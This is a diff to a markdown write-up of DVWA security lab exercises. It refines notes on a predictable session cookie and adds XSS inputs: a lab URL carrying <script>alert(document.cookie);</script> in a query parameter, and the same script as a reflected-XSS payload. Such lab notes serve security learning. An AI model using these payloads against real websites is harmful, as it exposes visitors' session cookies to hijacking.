@@ -240,21 +240,43 @@ output
 
 dvwaSession starts from 1. Each time the button is clicked session grows on one. dvwaSession connects with PHPSESSID.
 
-output before the first click
+output before the first click: dvwaSession doesn't exist
 
 ![alt text](images/photo_15.png)
 
-output after the first click
+output after the first click: dvwaSession = 1
 
 ![alt text](images/photo_16.png)
 
-output after the second one
+output after the second one: dvwaSession = 2
 
 ![alt text](images/photo_17.png)
 
 ### DOM Based Cross Site Scripting (XSS)
 
+input
+
+```bash
+http://192.168.10.3/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
+```
+
+output
+
+![alt text](images/photo_18.png)
+
 ### Reflected Cross Site Scripting (XSS)
+
+input
+
+```bash
+<script>alert(document.cookie);</script>
+```
+
+![alt text](images/photo_19.png)
+
+output
+
+![alt text](images/photo_20.png)
 
 ### Stored Cross Site Scripting (XSS)
 
